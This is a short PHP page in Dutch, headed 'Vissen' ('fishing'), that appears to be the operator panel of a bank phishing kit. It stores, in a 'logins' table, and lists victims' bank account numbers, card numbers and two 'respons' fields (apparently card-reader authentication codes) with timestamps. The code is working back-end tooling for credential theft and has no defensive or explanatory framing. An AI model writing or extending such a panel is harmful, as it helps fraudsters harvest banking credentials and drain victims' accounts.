<?php
$db = new PDO('sqlite:' . __DIR__ . '/data.db');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Zorg ervoor dat de tabel bestaat
$db->exec("CREATE TABLE IF NOT EXISTS logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    rekeningnummer TEXT,
    pasnummer TEXT,
    respons TEXT,
    respons2 TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$stmt = $db->query("SELECT * FROM logins ORDER BY created_at DESC");
$logins = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8">
  <title>Gegevens Overzicht</title>
  <style>
    table { border-collapse: collapse; width: 100%; }
    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
  </style>
</head>
<body>
  <h1>Vissen</h1>
  <table>
    <thead>
      <tr>
        <th>ID</th>
        <th>Rekeningnummer</th>
        <th>Pasnummer</th>
        <th>Respons</th>
        <th>Respons 2</th>
        <th>Aanmaakdatum</th>
      </tr>
    </thead>
    <tbody>
      <?php foreach($logins as $login): ?>
      <tr>
        <td><?= htmlspecialchars($login['id']) ?></td>
        <td><?= htmlspecialchars($login['rekeningnummer']) ?></td>
        <td><?= htmlspecialchars($login['pasnummer']) ?></td>
        <td><?= htmlspecialchars($login['respons']) ?></td>
        <td><?= htmlspecialchars($login['respons2']) ?></td>
        <td><?= htmlspecialchars($login['created_at']) ?></td>
      </tr>
      <?php endforeach; ?>
    </tbody>
  </table>
</body>
</html>
